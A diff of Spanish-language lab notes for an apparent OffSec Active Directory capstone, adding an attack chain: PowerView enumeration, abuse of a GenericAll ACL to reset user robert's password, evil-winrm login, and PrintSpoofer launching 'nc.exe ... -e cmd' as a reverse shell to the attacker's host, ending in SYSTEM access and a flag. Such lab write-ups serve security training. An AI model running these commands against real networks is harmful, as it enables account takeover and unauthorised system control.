@@ -25,27 +25,6 @@ Once logged in, repeat the enumeration process using techniques shown in this Mo
 
 ```powershell
 PS C:\Users\stephanie> iwr -uri http://192.168.45.213:8000/PowerView.ps1 -Outfile pv.ps1
-PS C:\Users\stephanie> dir
-
-    Directory: C:\Users\stephanie
-
-Mode                 LastWriteTime         Length Name
-----                 -------------         ------ ----
-d-r---         9/27/2022   6:07 AM                Contacts
-d-r---        10/27/2022  12:40 AM                Desktop
-d-r---        10/12/2022   5:09 AM                Documents
-d-r---         10/3/2022   9:57 AM                Downloads
-d-r---         9/27/2022   6:07 AM                Favorites
-d-r---         9/27/2022   6:07 AM                Links
-d-r---         9/27/2022   6:07 AM                Music
-d-r---         9/28/2022   8:03 AM                OneDrive
-d-r---         9/27/2022   6:07 AM                Pictures
-d-r---         9/27/2022   6:07 AM                Saved Games
-d-r---         9/27/2022   8:02 AM                Searches
-d-r---         9/27/2022   6:25 AM                Videos
--a----          7/1/2025   6:13 AM         770279 pv.ps1
-
-
 PS C:\Users\stephanie> . .\pv.ps1
 PS C:\Users\stephanie> Get-ObjectAcl -SamAccountName stephanie -ResolveGUIDs
 
@@ -1035,9 +1014,209 @@ DC1$                             GenericAll AccessAllowedObject CN=SYSVOL Subscr
 stephanie                        GenericAll       AccessAllowed CN=Management Department,DC=corp,DC=com
 stephanie                        GenericAll       AccessAllowed CN=robert,CN=Users,DC=corp,DC=com
 
+PS C:\Users\stephanie> Get-DomainUser robert
+
+
+pwdlastset            : 7/2/2025 12:31:09 PM
+usncreated            : 557211
+lastlogoff            : 12/31/1600 4:00:00 PM
+badpwdcount           : 0
+name                  : robert
+samaccounttype        : USER_OBJECT
+samaccountname        : robert
+whenchanged           : 7/2/2025 7:31:09 PM
+objectsid             : S-1-5-21-1987370270-658905905-1781884369-22101
+lastlogon             : 12/31/1600 4:00:00 PM
+objectclass           : {top, person, organizationalPerson, user}
+codepage              : 0
+cn                    : robert
+usnchanged            : 557228
+primarygroupid        : 513
+logoncount            : 0
+countrycode           : 0
+dscorepropagationdata : {7/2/2025 7:31:09 PM, 1/1/1601 12:00:00 AM}
+useraccountcontrol    : NORMAL_ACCOUNT
+accountexpires        : NEVER
+distinguishedname     : CN=robert,CN=Users,DC=corp,DC=com
+whencreated           : 7/2/2025 7:31:09 PM
+badpasswordtime       : 12/31/1600 4:00:00 PM
+instancetype          : 4
+objectguid            : 11d80fc9-092d-4f26-a10e-fe98ce2744aa
+objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=corp,DC=com
+
 ```
 
-#### Paso 2: ...
+#### Paso 2: Cambiamos credenciales de robert
+
+* Vector:
+Se encuentra que el usuario `robert` cae al el poder administrativo dentro del dominio por `stephanie`:
+Resultados del comando `Find-InterestingDomainAcl`
+
+Se procede por lo tanto a cambiarle la contrasena:
+
+```powershell
+Set-DomainUserPassword -Identity robert -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
+```
+> Es util en esta situacion donde podemos cambiar las credenciales de un usuario ver donde tiene sesiones activas.
+
+* Exploitamos el privilegio para logearnos como **robert**
+```powershell
+PS C:\Users\stephanie> runas /user:CORP\robert cmd
+Enter the password for CORP\robert:
+Attempting to start cmd as user "CORP\robert" ...
+```
+* Revisamos host por host y encontramos:
+
+```powershell
+PS C:\Tools> Get-NetSession -ComputerName client74
+
+CName        : \\192.168.234.75
+UserName     : robert
+Time         : 0
+IdleTime     : 0
+ComputerName : client74
+
+PS C:\Tools> Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
+
+Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultS
+         ecurity\
+Owner  : NT AUTHORITY\SYSTEM
+Group  : NT AUTHORITY\SYSTEM
+Access : BUILTIN\Users Allow  ReadKey
+         BUILTIN\Administrators Allow  FullControl
+         NT AUTHORITY\SYSTEM Allow  FullControl
+         CREATOR OWNER Allow  FullControl
+         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
+         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow
+         ReadKey
+Audit  :
+Sddl   : O:SYG:SYD:AI(A;CIID;KR;;;BU)(A;CIID;KA;;;BA)(A;CIID;KA;;;SY)(A;CIIOID;KA;;;CO)(A;CIID;KR;;;AC)(A;CIID;KR;;;S-1
+         -15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)
+```
+
+* Iniciamos sesion como robert en CLIENT74 y elevamos permisos administrador:
+```bash
+┌──(root㉿kali)-[/home/kali/OffSec/22-ActiveDirectory-Enumeration/Capstone]
+└─# evil-winrm -i 192.168.234.74 -u 'robert' -p "NewPass123\!" -P 5985
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\robert\Documents> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled # CHAN!
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+*Evil-WinRM* PS C:\Users\robert\Documents> whoami /groups
+                                                                                                                                                 
+GROUP INFORMATION                                                                                                                                
+-----------------                                                                                                                                
+                                                                                                                                                 
+Group Name                           Type             SID          Attributes                                                                    
+==================================== ================ ============ ===============================================================               
+Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group                            
+BUILTIN\Administrators               Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner               
+BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group                            
+NT AUTHORITY\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group                            
+NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group                            
+NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group                            
+NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group                            
+Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                                               
+*Evil-WinRM* PS C:\Users\robert\Documents> cd ..
+*Evil-WinRM* PS C:\Users\robert> dir
+                                                                                                                                                 
+    Directory: C:\Users\robert
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-r---          7/3/2025   4:35 PM                Contacts
+d-r---          7/3/2025   4:35 PM                Desktop
+d-r---          7/3/2025   4:35 PM                Documents
+d-r---          7/3/2025   4:35 PM                Downloads
+d-r---          7/3/2025   4:35 PM                Favorites
+d-r---          7/3/2025   4:35 PM                Links
+d-r---          7/3/2025   4:35 PM                Music
+d-r---          7/3/2025   4:36 PM                OneDrive
+d-r---          7/3/2025   4:35 PM                Pictures
+d-r---          7/3/2025   4:35 PM                Saved Games
+d-r---          7/3/2025   4:35 PM                Searches
+d-r---          7/3/2025   4:35 PM                Videos
+-a----          7/3/2025   4:46 PM          59392 nc.exe
+-a----          7/3/2025   4:42 PM          27136 ps.exe # PrintSpoofer64
+
+
+*Evil-WinRM* PS C:\Users\robert> .\ps.exe -c "C:\Users\robert\nc.exe 192.168.45.213 1234 -e cmd"
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+*Evil-WinRM* PS C:\Users\robert>
+
+```
+
+* En el receptor:
+```bash
+┌──(root㉿kali)-[/home/kali/OffSec/22-ActiveDirectory-Enumeration/Capstone]
+└─# nc -lvnp 1234                   
+listening on [any] 1234 ...
+connect to [192.168.45.213] from (UNKNOWN) [192.168.234.74] 51128
+Microsoft Windows [Version 10.0.22000.856]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>hostname
+hostname
+client74
+
+C:\Users> powershell -ep bypass
+PS C:\Users> Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue
+
+
+    Directory: C:\Users\administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----          7/4/2025   5:46 AM             78 proof.txt
+PS C:\Users\administrator\Desktop> type proof.txt
+type proof.txt
+OS{dd3f4a6f69bdec445b7e4b7b83d7c37a}
+PS C:\Users\administrator\Desktop>
+```
+
 ## Troubleshooting
 * Problemas con base de datos en bloodhound:
 ```bash
@@ -1056,6 +1235,10 @@ Ver Cluster Port Status Owner    Data directory              Log file
 Ver Cluster Port Status Owner    Data directory              Log file
 17  main    5432 online postgres /var/lib/postgresql/17/main /var/log/postgresql/postgresql-17-main.log
                                                                                                                                                                                                               
+```
+* Ejecutar PrintSpoofer desde el directorio correcto
+```powershell
+C:\Users\robert
 ```
 ## Herramientas Alternativas
 - [ ] **Herramienta 1:** Descripción breve (Comando)
